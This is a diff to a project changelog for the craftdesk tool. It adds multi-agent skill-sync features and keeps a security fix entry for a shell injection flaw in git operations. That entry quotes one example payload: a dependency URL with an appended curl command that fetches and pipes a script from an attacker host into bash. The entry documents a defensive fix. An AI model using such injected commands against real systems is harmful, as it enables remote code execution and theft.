@@ -4,6 +4,20 @@ All notable changes to this project will be documented in this file.
 
 ## 0.5.0 (Unreleased)
 
+### Added
+- **Multi-Agent Sync**: Sync skills across multiple AI coding assistants
+  - Auto-detect AI agents (Claude Code, Cursor, Windsurf, Continue.dev, etc.)
+  - Configure canonical location and sync targets in craftdesk.json
+  - Checksum-based verification to detect drift between copies
+  - New commands:
+    - `craftdesk setup-multi-agent` - Interactive multi-agent configuration
+    - `craftdesk detect-agents` - Detect installed AI coding assistants
+    - `craftdesk sync` - Sync crafts to all configured agents
+    - `craftdesk verify` - Verify sync status with checksum validation
+  - Auto-sync on install when enabled
+  - Support for copy-based sync (no symlinks, Windows-compatible)
+  - Comprehensive test coverage (unit + integration tests)
+
 ### Fixed
 - **Security**: Fixed shell injection vulnerability in git operations where malicious dependency URLs could execute arbitrary commands (e.g., `https://evil.com/repo.git; curl https://evil.com/steal.sh | bash`). Replaced `execSync()` with `execFileSync()` to prevent shell interpretation of metacharacters in git URLs, branch names, tag names, and commit hashes. Thanks to @ysamlan for the fix! [#40](https://github.com/mensfeld/craftdesk/pull/40)
 
